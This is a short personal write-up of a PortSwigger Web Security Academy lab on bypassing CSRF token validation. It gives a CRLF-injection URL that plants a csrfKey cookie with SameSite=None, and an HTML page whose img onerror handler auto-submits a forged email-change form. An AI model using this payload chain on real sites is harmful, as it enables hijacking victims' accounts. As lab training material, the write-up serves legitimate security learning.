#CSRF #CSRF-Tokens 

CSRF where token is tied to non-session cookie: [link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

**What is CRLF :**

CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

**What is SameSite Cookie :**
*SameSite cookie = YES* → The cookie is only sent **when you’re on the same site** (not from 
other sites).

to solve this challenge you should inject you *csrf cookie* in victim browser we can do this using CRLF and for sending cookies using form we will use *SameSite* 

* First, I injected cookies. There is a cookie called **LastSearch** that stores the value of the last thing you searched for. `web-security-academy.net/?search=Payload`
* i will replace payload with `%0d%0a` for CRLF and `Set-Cookie: csrfKey=myCookie;` for overwrite value of cookies and `SameSite=None` for send cookies form anywhere.

payload:
`https://0a62002503981edb83bd19c000c0000a.web-security-academy.net/?search=cc%0d%0aSet-Cookie:%20csrfKey=kJzdXA7VqbehLOl9uIx11X0XdsPncdwb%3bSameSite=None`

and this is the form :
```
<html>
	<form action="https://0a62002503981edb83bd19c000c0000a.web-security-academy.net/my-account/change-email" method="POST">
		<input required="" type="email" name="email" value="newE2mailf@gmail.com">
		<input required="" type="hidden" name="csrf" value="f4SXoM3LHbftgIGGF06fc4TdjtTAYRz6">
		<button class="button" type="submit"> Update email </button>
	</form>
	<img src="https://.web-security-academy.net/?search=cc%0d%0aSet-Cookie:%20csrfKey=kJzdXA7VqbehLOl9uIx11X0XdsPncdwb%3bSameSite=None" onerror="document.forms[0].submit()">
</html>


```